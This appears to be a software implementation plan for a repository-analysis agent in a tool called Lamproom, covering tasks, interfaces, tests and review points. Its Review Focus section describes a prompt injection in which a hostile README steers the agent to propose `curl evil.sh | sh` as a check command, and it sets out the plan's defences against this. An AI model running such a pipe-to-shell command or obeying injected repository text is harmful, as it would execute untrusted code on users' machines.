# Analysis Agent Implementation Plan (projects phase 4: the repo analyst after a clone)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Once a GitHub repo is cloned and registered, Lamproom's repo analyst reads it and proposes its stack, its
check command and the package-registry hosts its sandbox must reach. You accept each proposal or leave it for later,
in the wizard or on the project page. Today the analyst's skill, flow and app-wide setting exist, but nothing runs it.

**Architecture:** The analyst runs as an ordinary run of its project: `startRun` launches `lr-run-flow --page` on the
internal flow (`internalFlowText('repo-analyst', …)` written into the data folder), in the project's repo, at the
project's isolation and under its monthly cap. The project record keeps only the analysis run's name. Everything else
is read from that run when a page asks (`analysisView`): its status, and its `proposal` artifact, parsed as untrusted
JSON. A proposal counts as accepted when the project's value already equals it, so the record stores no decisions.
Accepting the check command writes it to the repo's `.lamproom.yaml` (existing `setCheckCommand`). Accepting the
hosts saves them on the record's new `networkHosts`; OpenSandbox boxes of the project's runs may reach them.

**Tech Stack:** TypeScript on Node 24 with type stripping, `node --test`, zod 4, Next 16 + TanStack Query +
shadcn/ui + lucide-react.

**Spec:** `docs/mockups/new-project-wizard.html` (`analyse()`, `proposals()`, the clone log lines),
`code/lamproom/internal/repo-analyst/SKILL.md` (the proposal's JSON shape) and `flow.yaml` (its fixed tools),
`docs/Lamproom/Projects/Project Settings.md` (the *Network hosts* and *Check command* rows: stored on the record,
never in the repo, for hosts; the repo's `.lamproom.yaml` for the check command).

**Not in this plan:** knowledge assets (Serena, graphify: phase 5; the skill already copes when they are absent),
the egress proxy that would hold Docker boxes to the hosts (Docker boxes stay online), analysing a local project
automatically (it gets an **Analyse** button), and a live test that spends money on a real analyst run.

## Global Constraints

- All paths are under `code/lamproom/` unless they start with `docs/`. Run commands from `code/lamproom/`.
- Branch `feature/analysis-agent`, cut from `dev` at `2b2c29d` in `.claude/worktrees/analysis-agent`. Do not merge
  into `dev`; Alex decides.
- **The analyst is a run of its project.** It goes through `startRun` and lr-run-flow like any run: the project's
  isolation, its monthly cap, the folder lock, a run folder in `runs/` (so its cost shows and counts). It is started
  with `allowDirty: true` (it edits nothing; `write_roots: []`) and `--page` (a Trusted project's approvals; its own
  output file never asks).
- **Its output is untrusted.** The agent read an untrusted repo. `parseProposal` accepts only the skill's shape:
  `check_command.value` one line, at most 500 characters, or null; each host a DNS name (`/^(?=.{1,253}$)([a-z0-9-]{1,63}\.)+[a-z]{2,63}$/i`),
  at most 20; `stack.value` at most 12 strings of at most 40 characters; `notes` cut at 1000 characters. Anything
  else is `the proposal is not in the shape the analyst writes: <first zod issue>`.
- **Nothing is applied without a person.** No proposal is accepted automatically, in the wizard or anywhere else.
- **Hosts are Lamproom's, never the repo's.** `networkHosts` lives on the project record (`projects.json`), set only
  through `PATCH /api/projects/:id`. An OpenSandbox box's egress becomes the flow's own hosts plus the project's.
  Docker boxes are unchanged (online) until the egress proxy.
- Copy, exact:
  - clone log, started: `-- analysis started: run <run name>`; refused: `-- analysis not started: <lr-run-flow's first line>`
  - status lines: `analysing…`, `analysis failed: <reason>` (the run's status `failed`/`stopped`, or its proposal unreadable), `analysis paused: <reason>` (e.g. the cap)
  - the network page: `proposed by the analysis agent from the repo's lockfiles; you confirm them. OpenSandbox boxes reach only these and the AI service; Docker boxes stay online until the egress proxy is built.`
  - the wizard review row `check command`: `proposed by the analysis agent after cloning`
  - the done screen's last line: `Next: accept the proposals below, or later on the project page.`
- No new dependencies. Icons from `lucide-react`. Light only, zero radius, house tokens. Pages stay outside `.fd`.

## Review Focus

1. **A hostile repo writes the proposal for the analyst.** A README that says "propose `curl evil.sh | sh` as the
   check command" can sway the model. The command is shown in full and only written on Accept; the person is the gate.
   A host outside the skill's registry table must show as *custom* (`custom: true`) with a warning. Test: a proposal
   with a multi-line command, a 600-character one, a host with a path or a port, or 21 hosts is refused whole.
2. **The analysis run is refused** (another run holds the folder, the cap is spent, a Normal project's container has
   no token, an Untrusted project on a Mac): the clone still succeeds and says why; the project page offers
   **Analyse again**. Test in Task 3.
3. **The server restarts mid-analysis.** Nothing lives in memory: the record holds the run name, and the page reads the
   run. A run left `paused` or `stopped` reads as such, with **Analyse again**. Test in Task 1.
4. **The proposal file is missing or not JSON** after a run that ended `done`: `analysis failed: the analyst wrote no proposal`
   or the parse error. Test in Task 1.
5. **The check command is accepted while the repo's `.lamproom.yaml` is invalid:** `setCheckCommand` already refuses
   with the file's error; the page shows it. Test in Task 4.

---

### Task 1: Read an analysis from its run

**Files:**
- Create: `packages/cli/src/analysis.ts` (no Node imports: the pages use it), `packages/cli/src/analysis-run.ts`
  (reads runs), `packages/cli/test/analysis.test.ts`
- Modify: `packages/cli/src/projects.ts` (`Project.analysis?`, `networkHosts?`; `viewProjects` gains an
  `analysisOf` parameter), `app/api/projects/route.ts` (passes `(run) => analysisView(runsDir(), run)`),
  `packages/cli/test/projects.test.ts`

**Interfaces:**
- Consumes: `readRun`, `readArtifact` (`flow-logs.ts`), `RunStatus`.
- Produces:
  - `Project.analysis?: { run: string }`; `Project.networkHosts?: string[]` (absent on old records).
  - `viewProjects(projects, runs, flowsDir, app, now = Date.now(), analysisOf: (run: string) => AnalysisView = …)`:
    the reader is passed in, because `projects.ts` importing `analysis-run.ts` would loop back through
    `flow-logs.ts` → `isolation.ts` → `projects.ts`. Its default returns `{ run, status: 'failed', error: 'not read', spentUsd: 0 }`.
  - `analysis.ts` holds the types and `parseProposal`; `analysis-run.ts` holds `analysisView` (and, in Task 2, `startAnalysis`):
    - `interface Proposal { stack: string[] | null; checkCommand: string | null; networkHosts: { host: string; evidence: string[]; custom: boolean }[] | null; evidence: { stack: string[]; checkCommand: string[] }; confidence: { stack?: Level; checkCommand?: Level; networkHosts?: Level }; notes: string }` with `type Level = 'high' | 'medium' | 'low'`.
    - `parseProposal(text: string): { ok: true; proposal: Proposal } | { ok: false; error: string }` (the skill's snake_case JSON in, camelCase out; the limits in Global Constraints).
    - `interface AnalysisView { run: string; status: 'running' | 'done' | 'failed' | 'paused'; spentUsd: number; error?: string; proposal?: Proposal }`
    - `analysisView(runsDir: string, run: string): AnalysisView`: `starting`/`running`/`waiting` → `running`;
      `done` with a valid proposal → `done`; `done` without one → `failed` with the reason; `failed`/`stopped` →
      `failed` (`the run <status>`); `paused` → `paused` (`the run paused; see its page`). A run folder that is gone →
      `failed`, `the run is gone`.
  - `ProjectView.analysis: AnalysisView | null`.

- [ ] **Step 1: Write the failing tests** (`analysis.test.ts`, with run folders written by hand: `flow.json`,
  `state.json`, and `<artifactsDir>/proposal.md`):
  - `parseProposal` takes the skill's example JSON (copied from SKILL.md §3) to the camelCase shape, `custom`
    defaulting to false; refuses each of: a two-line command, a 501-character one, `evil.com/x`, `evil.com:8080`,
    21 hosts, 13 stack entries, a top-level array, text that is not JSON, each with the shape error line.
  - `analysisView`: running → `running`; done + valid proposal → `done` with it and the run's `spentUsd`; done + no
    file → `failed`, `the analyst wrote no proposal`; done + bad JSON → `failed` with the parse error; `stopped` →
    `failed`, `the run stopped`; `paused` → `paused`; unknown run → `failed`, `the run is gone`.
  - `projects.test.ts`: `viewProjects(..., runsDir)` gives `analysis: null` for a record without one, and the view for
    one with `analysis: { run }`.

- [ ] **Step 2: Run them to verify they fail.** Run: `node --test packages/cli/test/analysis.test.ts packages/cli/test/projects.test.ts`. Expected: FAIL, `analysis.ts` not found.

- [ ] **Step 3: Implement.** `readProjects` keeps `analysis` and `networkHosts` as they are (absent stays absent).

- [ ] **Step 4: Run them to verify they pass**, then `pnpm test:packages`. Expected: PASS (known flaky tests aside: list them by name if they fail, and rerun them alone).

- [ ] **Step 5: Commit** `feat(projects): read a repo analysis from its run`

### Task 2: Start an analysis

**Files:**
- Modify: `packages/cli/src/analysis-run.ts`, `packages/cli/test/analysis.test.ts`, `packages/cli/src/projects.ts`
  (`setAnalysisRun`), `app/api/projects/[id]/analysis/route.ts` (create)

**Interfaces:**
- Consumes: `internalFlowText`, `readAppSettings`, `startRun`, `Started` (`flow-start.ts`).
- Produces:
  - `startAnalysis(dataDir: string, runsDir: string, project: Project, start = startRun): Promise<{ ok: true; run: string } | { ok: false; error: string }>`:
    writes `internalFlowText('repo-analyst', readAppSettings(dataDir).internal['repo-analyst'])` to
    `<dataDir>/internal/repo-analyst.yaml`, calls `start(runsDir, <dataDir>/internal, { flow: 'repo-analyst', folder: project.repoPath, task: ANALYST_TASK, allowDirty: true }, dataDir)`,
    and on success saves `analysis: { run }` on the record (`setAnalysisRun(dataDir, id, run)`). A refusal saves nothing.
  - `ANALYST_TASK = 'Analyse this repository: propose its stack, its check command and the network hosts its sandbox must reach.'`
  - `POST /api/projects/:id/analysis` → `{ run }`, or 422 `{ error }` with lr-run-flow's words, 404 for no project.

- [ ] **Step 1: Write the failing tests:** with a fake `start` that records its arguments and returns
  `{ ok: true, name: '2026-11-13T10-00-00-repo-analyst' }`: the flow file exists and loads (`loadFlow`) with the app's
  internal model and budget; `start` got the project's folder, `allowDirty: true` and the data folder; the record's
  `analysis.run` is the name. With a fake that refuses (`{ ok: false, error: 'flow.yaml: --folder: another lr-run-flow …' }`):
  `{ ok: false, error }` and the record unchanged.
- [ ] **Step 2: Run them to verify they fail.** Run: `node --test packages/cli/test/analysis.test.ts`. Expected: FAIL.
- [ ] **Step 3: Implement**, and the route (behind `refused(request)`, like every write route).
- [ ] **Step 4: Run them to verify they pass**, then `pnpm test:packages`. Expected: PASS.
- [ ] **Step 5: Commit** `feat(projects): start the repo analyst on a project`

### Task 3: The clone starts it

**Files:**
- Modify: `packages/cli/src/clone.ts` (`startClone` gains `runsDir` and an `analyse` dependency),
  `app/api/projects/clone/route.ts`, `packages/cli/test/clone.test.ts`

**Interfaces:**
- Consumes: `startAnalysis`.
- Produces: `startClone(dataDir, flowsDir, runsDir, input, gh = 'gh', quietMs = 5 * 60_000, analyse = startAnalysis)`.
  After registration, the job calls `analyse(dataDir, runsDir, project)`, logs the started or refused line, and only
  then sets `phase: 'done'`. A refusal never fails the clone.

- [ ] **Step 1: Write the failing tests** (the existing fake-gh clone, with a fake `analyse`): a clone that succeeds
  calls `analyse` once with the registered project, and the job's lines end with `-- analysis started: run <name>`;
  with an `analyse` that refuses, the job is still `done` and its last line is `-- analysis not started: <reason>`.
  A failed clone never calls `analyse`.
- [ ] **Step 2: Run them to verify they fail.** Run: `node --test packages/cli/test/clone.test.ts`. Expected: FAIL.
- [ ] **Step 3: Implement** (update every `startClone` caller and the existing clone tests for the new parameter).
- [ ] **Step 4: Run them to verify they pass**, then `pnpm test:packages`. Expected: PASS.
- [ ] **Step 5: Commit** `feat(projects): a clone starts the repo analyst`

### Task 4: Accept a proposal, and hosts reach OpenSandbox boxes

**Files:**
- Modify: `packages/cli/src/analysis.ts` (`analysisAccepted`), `packages/cli/src/projects.ts` (`ProjectEdit.networkHosts`), `app/api/projects/[id]/route.ts`,
  `packages/cli/src/isolation.ts` (`isolationFor` gains `hosts`), `packages/cli/src/flow-run.ts` (passes
  `project.networkHosts`), `packages/cli/test/projects.test.ts`, `packages/cli/test/isolation.test.ts`

**Interfaces:**
- Consumes: `setCheckCommand` (already behind `PATCH /api/projects/:id { checkCommand }`).
- Produces:
  - `ProjectEdit.networkHosts?: string[]`: each a DNS name as in `parseProposal`, at most 20, sorted and de-duplicated
    on save; anything else 400 `network hosts: <host> is not a host name`.
  - `isolationFor(trust, flow, needs, gvisor, hosts: string[] = [])`: an OpenSandbox sandbox's `egress` becomes the
    flow's own plus `hosts`, de-duplicated; every other result unchanged.
  - `analysisAccepted(view: ProjectView): { checkCommand: boolean; networkHosts: boolean }`: true when the project's
    value already holds the proposal's (`checkCommand` equal; every proposed host in `networkHosts`). In `analysis.ts`,
    for the pages; it imports `ProjectView` as a type only.

- [ ] **Step 1: Write the failing tests:** `updateProject` with `networkHosts: ['pypi.org', 'registry.npmjs.org', 'pypi.org']`
  saves `['pypi.org', 'registry.npmjs.org']`; with `['evil.com/x']` → 400 with the line. `isolationFor('normal',
  { runtime: 'opensandbox', image: 'i', egress: ['api.anthropic.com'], credentials: [] }, [], false, ['pypi.org'])`
  → egress `['api.anthropic.com', 'pypi.org']`; a docker result has no egress key. Accepting the check command on a
  repo whose `.lamproom.yaml` does not parse → the existing 400 with the file's error. `analysisAccepted` true/false
  for each key.
- [ ] **Step 2: Run them to verify they fail.** Run: `node --test packages/cli/test/projects.test.ts packages/cli/test/isolation.test.ts`. Expected: FAIL.
- [ ] **Step 3: Implement.** `isolate` in `flow-run.ts` passes `project.networkHosts ?? []`; the resume check compares
  sandboxes without `egress` already, so a host accepted after a run started does not refuse its resume.
- [ ] **Step 4: Run them to verify they pass**, then `pnpm test:packages`. Expected: PASS.
- [ ] **Step 5: Commit** `feat(projects): accept the analyst's proposals; project hosts reach OpenSandbox boxes`

### Task 5: The pages

**Files:**
- Create: `app/projects/analysis.tsx` (`Analysis`: the proposals card, shared by the wizard and the project page)
- Modify: `app/projects/api.ts` (`startAnalysis`, `acceptCheckCommand`, `acceptHosts` mutations), `app/projects/project.tsx`,
  `app/projects/wizard/finish.tsx`, `app/projects/settings-pages.tsx` (the network page copy)

**Interfaces:**
- Consumes: `ProjectView.analysis`, `analysisAccepted`, `PATCH /api/projects/:id`, `POST /api/projects/:id/analysis`.
- Produces: `<Analysis project={ProjectView} />`:
  - `running`: `analysing…` and a link to the run's page.
  - `done`: header `the analysis agent proposes · $<spent>`, then one row per proposal, as the mockup's `proposals()`:
    **Check command** (the command in full, in `font-mono`, its evidence) and **Network access** (the hosts, each
    *custom* one marked with a lucide `TriangleAlert` and `not a public package registry: check it`). Each row has
    **Accept**, or `accepted` once `analysisAccepted` says so. **Later** in the wizard only, which hides the row there
    (`on the project page`). A null value: `nothing to go on: <notes>. Set one on the project page.` The stack, as a
    line of chips. No row for the stack: it is shown, not accepted.
  - `failed` / `paused`: `analysis failed: <reason>` / `analysis paused: <reason>`, a link to the run, and **Analyse again**.
  - No analysis (a local project, or an old record): **Analyse** with `reads the repo and proposes its check command
    and network hosts; about $<internal budget> at most`.

- [ ] **Step 1: Build `Analysis` and wire it:** under the done box in `finish.tsx` (the project query polls every
  2 s while `running`), and as a card on the project page beside the settings. Update the copy listed in Global
  Constraints.
- [ ] **Step 2: Typecheck and test.** Run: `pnpm exec tsc --noEmit`, `pnpm test:app`, `pnpm test:packages`. Expected: clean, PASS.
- [ ] **Step 3: Check it in the browser, without spending money.** On a dev server for this worktree (another port,
  `LAMPROOM_DATA_DIR`/`RUNS_DIR`/`FLOWS_DIR` in a scratch folder): register a test repo, write a finished
  `repo-analyst` run folder by hand whose `proposal.md` proposes `node --test` and `registry.npmjs.org` plus a custom
  `npm.internal.example.com`, and set the record's `analysis.run` to it. The project page shows both rows and the
  custom warning; **Accept** on the check command writes `check_command: node --test` to the repo's `.lamproom.yaml`
  and the row reads `accepted`; **Accept** on the hosts saves `networkHosts`. Then a run folder left `running`:
  `analysing…`. Then **Analyse again** on a project whose folder is locked by a fake lock: the refusal shows.
- [ ] **Step 4: Commit** `feat(projects): the analyst's proposals in the wizard and on the project page`

### Task 6: Docs

**Files:**
- Modify: `docs/Lamproom/Projects/Project Settings.md` (the *Network hosts* and *Check command* rows: built, and how),
  `docs/Lamproom/Projects/Projects Index.md` (the *Built* callout), `docs/Lamproom/Projects/Creating A Project.md`
  (the clone's last stage), `docs/Lamproom/Capability Library/Seeded Capabilities.md` (the analyst now runs)

- [ ] **Step 1: Edit the notes.** Each claim names the function, route or line it describes. Say plainly that Docker
  boxes do not yet keep to the hosts.
- [ ] **Step 2: Commit** `docs(projects): the repo analyst runs after a clone`

## Decisions open to Alex's review

1. The analyst runs as a normal run of its project, so it needs what any run there needs: a Normal project's container
   needs `CLAUDE_CODE_OAUTH_TOKEN` (or the internal step set to OpenCode with the OpenRouter key), and an Untrusted
   project on a Mac is refused. Running it on this machine instead, with its fixed read-only tools, would always work
   but would be the one run that skips its project's isolation.
2. Only GitHub clones are analysed automatically; a local project gets an **Analyse** button.
3. A proposal is "accepted" when the project's value already equals it; nothing records *Later*. A proposal you never
   accept stays on the project page until the next analysis replaces it.
4. The hosts are accepted as one set, as in the mockup; to drop one, accept and then edit the list (no editor in this
   plan: `PATCH /api/projects/:id { networkHosts }` only).
5. Accepted hosts only reach OpenSandbox boxes. Docker boxes, the Normal default, stay online until the egress proxy.
